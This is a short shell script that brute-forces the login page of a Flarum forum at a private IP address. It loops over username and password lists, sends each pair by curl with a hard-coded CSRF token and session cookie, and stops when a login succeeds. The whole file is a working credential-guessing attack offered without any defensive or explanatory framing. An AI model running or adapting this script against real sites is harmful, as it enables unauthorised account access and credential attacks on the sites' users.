#!/bin/sh


Request (){
curl -o /dev/null -s -w "%{http_code}\n" -X POST -H "Content-Type: application/json" \
        -H "Accept: */*" \
        -H "Accept-Encoding: gzip, deflate" \
        -H "Accept-Language: en-us" \
        -H "Origin: http://172.16.4.3:8080" \
        -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15" \
        -H "Connection: keep-alive" \
        -H "Referer: http://172.16.4.3:8080/" \
        -H "X-CSRF-Token: qheH4dzPl0nSkjPlkIZtm3pIfX4pgjaAxVlWFI15" \
        -H "Cookie: flarum_session=C9J70piUW3WDKAee3sf619I744n9ImW3ecPv3Lai" \
        -d "{\"identification\":\"$user_in_file\",\"password\":\"$password_in_file\",\"remember\":false}" \
        http://172.16.4.3:8080/login
}

#Main body
#The section should not be chaged
while read user_in_file
do
while read password_in_file
do
echo "\n"
echo "[*] Cheching login: $user_in_file and password: $password_in_file"
case `Request` in
	200)
	echo "[*] SUCCESS: 200"
	exit 1
	;;
	400)
	echo "[*] BAD REQUEST: 400"
	;;
	401)
	echo "[*] UNAUTHORIZED: 401"
	;;
	*)
	echo "[*] UNKNOWN ISSUE: `Request`"
	;;
	esac
done < passwords.txt
done < usernames.txt
